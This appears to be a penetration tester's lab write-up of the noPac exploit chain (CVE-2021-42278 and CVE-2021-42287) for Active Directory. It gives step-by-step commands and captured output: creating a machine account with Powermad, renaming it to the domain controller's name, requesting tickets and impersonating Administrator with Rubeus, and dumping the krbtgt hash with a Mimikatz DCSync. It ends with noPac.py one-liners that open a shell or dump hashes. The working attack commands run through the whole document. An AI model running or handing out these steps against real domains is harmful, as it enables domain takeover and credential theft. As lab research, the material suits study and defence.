========================================================================================================================================
NoPac / SamAccountName Impersonation exploit (CVE-2021-42278 and CVE-2021-42287)
========================================================================================================================================

Domain privilege escalation from a standard domain user by exploiting the vulnerabilities:
> CVE-2021-42278 - Name impersonation / NoPac vulnerability
> CVE-2021-42287 - KDC bamboozling

The vulnerabilities CVE-2021-42278 and CVE-2021-42287 allow to impersonate DA from standard domain user.

========================================================================================================================================
1. Manual exploit of the vulnerabilities using a set of common pentesting tools (Powermad, Rubeus, PowerSplit, Mimikatz)
========================================================================================================================================

URLs
-----
> https://exploit.ph/more-samaccountname-impersonation.html
> https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html
> https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing

Attack methodology and steps
-----------------------------
Step 1. Create a controlled machine account using a standard domain user (default settings allow this operation)
Step 2. Clear the controlled machine account servicePrincipalName attribute of any value that points to its name 
        (e.g. host/machine.domain.local, RestrictedKrbHost/machine.domain.local) 
Step 3. Change the controlled machine account sAMAccountName to a Domain Controller's name without the trailing (CVE-2021-42278)
Step 4. Request a TGT for the controlled machine account
Step 5. Reset the controlled machine account sAMAccountName to its old value (or anything else different than the Domain Controller's name without the trailing $)
Step 6. Request a service ticket with S4U2self by presenting the TGT obtained before (CVE-2021-42287)
Step 7. Become Domain Admin by using a DCsync attack

Tools used for the PoC on my testing lab
----------------------------------------
> PowerMad (https://github.com/Kevin-Robertson/Powermad/)
> PowerSploit (https://github.com/PowerShellMafia/PowerSploit)
> Rubeus (https://github.com/GhostPack/Rubeus)
> Mimikatz (https://github.com/gentilkiwi/mimikatz)

Note: other tools could be used to automate the attack such as noPac (https://github.com/cube0x0/noPac)...


======================================================================================================
PoC - Step 1 - Create a computer account 'ControlledComputer' using 'PowerMad'
======================================================================================================

Note: I am logged with a standard domain user on a Windows 10 machine member of my testing lab domain (security-lab).

Microsoft Windows [Version 10.0.19042.1415]
(c) Microsoft Corporation. All rights reserved.

C:\Users\ALEXANDER_DICKSON>powershell -exec bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\ALEXANDER_DICKSON> cd '.\Documents\'
PS C:\Users\ALEXANDER_DICKSON\Documents> cd .\Powermad-master\
PS C:\Users\ALEXANDER_DICKSON\Documents\Powermad-master> Import-Module .\Powermad.psd1
PS C:\Users\ALEXANDER_DICKSON\Documents\Powermad-master> $password = ConvertTo-SecureString 'Sup3rP@ssw0rd' -AsPlainText -Force
PS C:\Users\ALEXANDER_DICKSON\Documents\Powermad-master> New-MachineAccount -MachineAccount "ControlledComputer" -Password $($password) -Domain "security-test-lab.local" -DomainController "temp-dc.security-test-lab.local" -Verbose
VERBOSE: [+] SAMAccountName = ControlledComputer$
VERBOSE: [+] Distinguished Name = CN=ControlledComputer,CN=Computers,DC=security-test-lab,DC=local
[+] Machine account ControlledComputer added
PS C:\Users\ALEXANDER_DICKSON\Documents\Powermad-master>


======================================================================================================
PoC - Step 2 - Clear its SPNs using 'PowerSploit'
======================================================================================================

PS C:\Users\ALEXANDER_DICKSON\Documents\Powermad-master> cd ..
PS C:\Users\ALEXANDER_DICKSON\Documents> cd .\PowerSploit-master\
PS C:\Users\ALEXANDER_DICKSON\Documents\PowerSploit-master> Import-Module .\PowerSploit.psd1
PS C:\Users\ALEXANDER_DICKSON\Documents\PowerSploit-master> cd .\Recon\
PS C:\Users\ALEXANDER_DICKSON\Documents\PowerSploit-master\Recon> Import-Module .\Recon.psd1

PS C:\Users\ALEXANDER_DICKSON\Documents\PowerSploit-master\Recon> Set-DomainObject "CN=ControlledComputer,CN=Computers,DC=security-test-lab,DC=local" -Clear 'serviceprincipalname' -Verbose
VERBOSE: [Get-DomainSearcher] search base: LDAP://TEMP-DC.SECURITY-TEST-LAB.LOCAL/DC=SECURITY-TEST-LAB,DC=LOCAL
VERBOSE: [Get-DomainObject] Extracted domain 'security-test-lab.local' from 'CN=ControlledComputer,CN=Computers,DC=security-test-lab,DC=local'
VERBOSE: [Get-DomainSearcher] search base: LDAP://TEMP-DC.SECURITY-TEST-LAB.LOCAL/DC=security-test-lab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=ControlledComputer,CN=Computers,DC=security-test-lab,DC=local)))
VERBOSE: [Set-DomainObject] Clearing 'serviceprincipalname' for object 'ControlledComputer$'

PS C:\Users\ALEXANDER_DICKSON\Documents\PowerSploit-master\Recon>


======================================================================================================
PoC - Step 3 - Rename the computer 'ControlledComputer' with the name of the DC using 'PowerMad'
======================================================================================================

PS C:\Users\ALEXANDER_DICKSON\Documents\PowerSploit-master\Recon> Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "temp-dc" -Attribute samaccountname -Verbose
VERBOSE: [+] Domain Controller = TEMP-DC.Security-Test-Lab.Local
VERBOSE: [+] Domain = Security-Test-Lab.Local
VERBOSE: [+] Distinguished Name = CN=ControlledComputer,CN=Computers,DC=Security-Test-Lab,DC=Local


======================================================================================================
PoC - Step 4 - Obtain a TGT using 'Rubeus'
======================================================================================================

PS C:\Users\ALEXANDER_DICKSON\Documents> .\Rubeus.exe asktgt /user:"temp-dc" /password:"Sup3rP@ssw0rd" /domain:"security-test-lab.local" /dc:"temp-dc.security-test-lab.local" /nowrap
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 5BC94553215153A1F9EE376493EE028A
[*] Building AS-REQ (w/ preauth) for: 'security-test-lab.local\temp-dc'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFqjCCBaagAwIBBaEDAgEWooIEnzCCBJthggSXMIIEk6ADAgEFoRkbF1NFQ1VSSVRZLVRFU1QtTEFCLkxPQ0FMoiwwKqADAgECoSMwIRsGa3JidGd0GxdzZWN1cml0eS10ZXN0LWxhYi5sb2NhbKOCBEEwggQ9oAMCARKhAwIBAqKCBC8EggQrqn4Xy+LflO4AY7mYoEYtvnBUKrQ6fyWhIFHSuwol6OGqzanUXVOfZvi8wQs8cqKJfkRL0PeaRYuMAQfVjxZ/W6jhROhscOv3OWUMLQmi7HfrMRjYRVjz3CZS8Up/yKPpf6mFLdzhQgnBXe+SPwULFu/Pu2BWAot5P8uHEc55sOZUan6qKehgoWoA/iXhoglIGGsJbSm237Aa+4KHxwaLBTKIA9+i8tfYwv1BK2Y9kp+IRrjyYklBeAdB5UEVpGZs8A45k7wP58lwc2fii1oRHCNsKBLQl+LCasht5KRjctKcCIqCJT08ZYN7IXl3Dl/RADCcFIKQ6UlyaTRP1p8uZpEJfQWmatezDXyHFHZ5tzBREyRZZJUZAZjZ7eYr3ucESltxjGHGYtN3+ZdttLB8T9aHOMzHMdTNaD/hYcCSkSgygfgok3zCL268pV+2LeT/hWfb4T8jJ0yGQPoh9XTRoUfsmn+zKNQjL/FiZZPK57RNgdgCsrUzpgVQJcwD5WtpmGwEy3MfkyOM6E46WCpk0WVLlYD7eZWCKmoQ/tPMndIoEuIz5Z0FG8D0fw2i1FUFqeWJ3Yz2DSnntYZiAM9S+dOexOUXRLDYRzUOx/PwCpj47jD4LMR4LRQ7O5H5XDBDD6ixUQe9ibaC0vjZA1T7tZ1MOFCau+/J2+FxdsyLEfrBNTf/oYwSJZH4Ktbtko6mduNiBTC8EHNgcku6+QtEhEnLNUphQOasIqjL88N+5Khmmu/rVHFZ5OaaInWrD9cEUSP3Fb7EMjaGDfp/6tO1MH/2DXCL2yp/I1Ipz0j5fm1BMdNu//tvyzK/QAT9VnMFBwlkjPJEApMif1tgKrusfO95/CjClu8+2+pbSWG5ArgLJO7KIl+eUWc9JbIrUm6fNiFF0uSyiODl/+GQMERhLZi7VqbPs6O90RXWD3hd8Upmk97u9bNnqQ6qd0xCNIV+NGPcQtzx9algTmvgGB/wMvvz7DwV3KMx80Tw7uYPvMm7QHxPjgTAnkzO1LVL/vIVQfLAojeSE+oeJuxV6botboOl+ft2r2qa+a/LQXtzuF+kLbks8y3l3mXZtym4Q2GRcyUwsYg0ByoUsE7CKI7AkUDgnpUaYMVv3FNuMM/toyRAq5lUAUcxOmjCbWjUQcGEKMxGZ/zlwINmkeGkO8UZXr+PtYzDjIflurwev9MZrtDtgIRmDxj85/CDaHDeoNMHummi4ijM1ccrvkDnqZF/r1UnzzRvlvtrNhLP4djYtOaN4prIH33uCr3XWRAC3meXeOYtOLbOcj+sbiIbyUCQOEbHLTdHyzeSOlOLcNRyFvsk4o6k1yFWCQEld5ZxuWHRHLjty4I6+UPibdOSlsCuRyPZkPqo5tifQQEUUMPoC+bscfOlYkyofKYXijURqAMyOng7Zh8Qq26+XAqjgfYwgfOgAwIBAKKB6wSB6H2B5TCB4qCB3zCB3DCB2aAbMBmgAwIBF6ESBBB0U22wethgUSfV9eQgvLxJoRkbF1NFQ1VSSVRZLVRFU1QtTEFCLkxPQ0FMohQwEqADAgEBoQswCRsHdGVtcC1kY6MHAwUAQOEAAKURGA8yMDIxMTIyOTAxMDU1NVqmERgPMjAyMTEyMjkxMTA1NTVapxEYDzIwMjIwMTA1MDEwNTU1WqgZGxdTRUNVUklUWS1URVNULUxBQi5MT0NBTKksMCqgAwIBAqEjMCEbBmtyYnRndBsXc2VjdXJpdHktdGVzdC1sYWIubG9jYWw=

  ServiceName           :  krbtgt/security-test-lab.local
  ServiceRealm          :  SECURITY-TEST-LAB.LOCAL
  UserName              :  temp-dc
  UserRealm             :  SECURITY-TEST-LAB.LOCAL
  StartTime             :  12/28/2021 5:05:55 PM
  EndTime               :  12/29/2021 3:05:55 AM
  RenewTill             :  1/4/2022 5:05:55 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  rc4_hmac
  Base64(key)           :  dFNtsHrYYFEn1fXkILy8SQ==


======================================================================================================
PoC - Step 5 - Reset the computer name using 'PowerMad'
======================================================================================================

PS C:\Users\ALEXANDER_DICKSON\Documents> Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "ControlledComputer" -Attribute samaccountname -Verbose
VERBOSE: [+] Domain Controller = TEMP-DC.Security-Test-Lab.Local
VERBOSE: [+] Domain = Security-Test-Lab.Local
VERBOSE: [+] Distinguished Name = CN=ControlledComputer,CN=Computers,DC=Security-Test-Lab,DC=Local
[+] Machine account ControlledComputer attribute samaccountname updated


=======================================================================================================
PoC - Step 6 - Obtain a service ticket with S4U2self by presenting the previous TGT using 'Rubeus'
=======================================================================================================

PS C:\Users\ALEXANDER_DICKSON> net group 'Domain Admins' /domain
The request will be processed at a domain controller for domain Security-Test-Lab.Local.

Group name     Domain Admins
Comment        Designated administrators of the domain

Members
-------------------------------------------------------------------------------
Administrator            DIANNA_MYERS             Qualys
The command completed successfully.

PS C:\Users\ALEXANDER_DICKSON\Documents> .\Rubeus.exe s4u /self /impersonateuser:"Administrator" /altservice:"ldap/temp-dc.security-test-lab.local" /dc:"temp-dc.security-test-lab.local" /ptt /ticket:doIFqjCCBaagAwIBBaEDAgEWooIEnzCCBJthggSXMIIEk6ADAgEFoRkbF1NFQ1VSSVRZLVRFU1QtTEFCLkxPQ0FMoiwwKqADAgECoSMwIRsGa3JidGd0GxdzZWN1cml0eS10ZXN0LWxhYi5sb2NhbKOCBEEwggQ9oAMCARKhAwIBAqKCBC8EggQrqn4Xy+LflO4AY7mYoEYtvnBUKrQ6fyWhIFHSuwol6OGqzanUXVOfZvi8wQs8cqKJfkRL0PeaRYuMAQfVjxZ/W6jhROhscOv3OWUMLQmi7HfrMRjYRVjz3CZS8Up/yKPpf6mFLdzhQgnBXe+SPwULFu/Pu2BWAot5P8uHEc55sOZUan6qKehgoWoA/iXhoglIGGsJbSm237Aa+4KHxwaLBTKIA9+i8tfYwv1BK2Y9kp+IRrjyYklBeAdB5UEVpGZs8A45k7wP58lwc2fii1oRHCNsKBLQl+LCasht5KRjctKcCIqCJT08ZYN7IXl3Dl/RADCcFIKQ6UlyaTRP1p8uZpEJfQWmatezDXyHFHZ5tzBREyRZZJUZAZjZ7eYr3ucESltxjGHGYtN3+ZdttLB8T9aHOMzHMdTNaD/hYcCSkSgygfgok3zCL268pV+2LeT/hWfb4T8jJ0yGQPoh9XTRoUfsmn+zKNQjL/FiZZPK57RNgdgCsrUzpgVQJcwD5WtpmGwEy3MfkyOM6E46WCpk0WVLlYD7eZWCKmoQ/tPMndIoEuIz5Z0FG8D0fw2i1FUFqeWJ3Yz2DSnntYZiAM9S+dOexOUXRLDYRzUOx/PwCpj47jD4LMR4LRQ7O5H5XDBDD6ixUQe9ibaC0vjZA1T7tZ1MOFCau+/J2+FxdsyLEfrBNTf/oYwSJZH4Ktbtko6mduNiBTC8EHNgcku6+QtEhEnLNUphQOasIqjL88N+5Khmmu/rVHFZ5OaaInWrD9cEUSP3Fb7EMjaGDfp/6tO1MH/2DXCL2yp/I1Ipz0j5fm1BMdNu//tvyzK/QAT9VnMFBwlkjPJEApMif1tgKrusfO95/CjClu8+2+pbSWG5ArgLJO7KIl+eUWc9JbIrUm6fNiFF0uSyiODl/+GQMERhLZi7VqbPs6O90RXWD3hd8Upmk97u9bNnqQ6qd0xCNIV+NGPcQtzx9algTmvgGB/wMvvz7DwV3KMx80Tw7uYPvMm7QHxPjgTAnkzO1LVL/vIVQfLAojeSE+oeJuxV6botboOl+ft2r2qa+a/LQXtzuF+kLbks8y3l3mXZtym4Q2GRcyUwsYg0ByoUsE7CKI7AkUDgnpUaYMVv3FNuMM/toyRAq5lUAUcxOmjCbWjUQcGEKMxGZ/zlwINmkeGkO8UZXr+PtYzDjIflurwev9MZrtDtgIRmDxj85/CDaHDeoNMHummi4ijM1ccrvkDnqZF/r1UnzzRvlvtrNhLP4djYtOaN4prIH33uCr3XWRAC3meXeOYtOLbOcj+sbiIbyUCQOEbHLTdHyzeSOlOLcNRyFvsk4o6k1yFWCQEld5ZxuWHRHLjty4I6+UPibdOSlsCuRyPZkPqo5tifQQEUUMPoC+bscfOlYkyofKYXijURqAMyOng7Zh8Qq26+XAqjgfYwgfOgAwIBAKKB6wSB6H2B5TCB4qCB3zCB3DCB2aAbMBmgAwIBF6ESBBB0U22wethgUSfV9eQgvLxJoRkbF1NFQ1VSSVRZLVRFU1QtTEFCLkxPQ0FMohQwEqADAgEBoQswCRsHdGVtcC1kY6MHAwUAQOEAAKURGA8yMDIxMTIyOTAxMDU1NVqmERgPMjAyMTEyMjkxMTA1NTVapxEYDzIwMjIwMTA1MDEwNTU1WqgZGxdTRUNVUklUWS1URVNULUxBQi5MT0NBTKksMCqgAwIBAqEjMCEbBmtyYnRndBsXc2VjdXJpdHktdGVzdC1sYWIubG9jYWw=

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: S4U

[*] Action: S4U

[*] Using domain controller: temp-dc.security-test-lab.local (2a01:e34:ec6f:d7e0:55d7:c826:4294:b8ed)
[*] Building S4U2self request for: 'temp-dc@SECURITY-TEST-LAB.LOCAL'
[*] Sending S4U2self request
[+] S4U2self success!
[*] Substituting alternative service name 'ldap/temp-dc.security-test-lab.local'
[*] Got a TGS for 'Administrator@SECURITY-TEST-LAB.LOCAL' to 'ldap@SECURITY-TEST-LAB.LOCAL'
[*] base64(ticket.kirbi):

      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

[+] Ticket successfully imported!
PS C:\Users\ALEXANDER_DICKSON\Documents>


======================================================================================================
PoC - Step 7 - DCSync attack using 'Mimikatz' 
======================================================================================================

PS C:\Users\ALEXANDER_DICKSON\Documents> 
PS C:\Users\ALEXANDER_DICKSON\Documents> . .\Invoke-Mimikatz.ps1
PS C:\Users\ALEXANDER_DICKSON\Documents>  Invoke-Mimikatz -Command '"lsadump::dcsync /user:security-lab\krbtgt /domain:security-test-lab.local /dc:temp-dc.security-test-lab.local"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::dcsync /user:security-lab\krbtgt /domain:security-test-lab.local /dc:temp-dc.security-test-lab.local
[DC] 'security-test-lab.local' will be the domain
[DC] 'temp-dc.security-test-lab.local' will be the DC server
[DC] 'security-lab\krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 4/14/2020 11:00:23 PM
Object Security ID   : S-1-5-21-3698357007-189532211-3203426890-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 208ae4a2c5aa7b40d047349<SNIP>
    ntlm- 0: 208ae4a2c5aa7b40d047349<SNIP>
    lm  - 0: bb25cb33e1e02367f2fc2af<SNIP>
<SNIP>

=> The attack worked !! :)


========================================================================================================================================
2. Other Method - NoPAC tool (https://github.com/Ridter/noPac)
========================================================================================================================================

The tool NoPac allows to easily exploit the vulnerabilities CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user.

1. Exemple - Auto get shell
=============================
> python noPac.py target-domain.local/auditor:'SuperPassw0rd1' -dc-ip 10.X.X.X -dc-host DChsost2012 -shell --impersonate administrator 


2. Exemple - Dump hash
=============================
> python noPac.py target-domain.local/auditor:'SuperPassw0rd1' -dc-ip 10.X.X.X -dc-host DChsost2012 --impersonate administrator -dump
> python noPac.py target-domain.local/auditor:'SuperPassw0rd1' -dc-ip 10.X.X.X -dc-host DChsost2012 --impersonate administrator -dump -just-dc-user target-domain.local/krbtgt

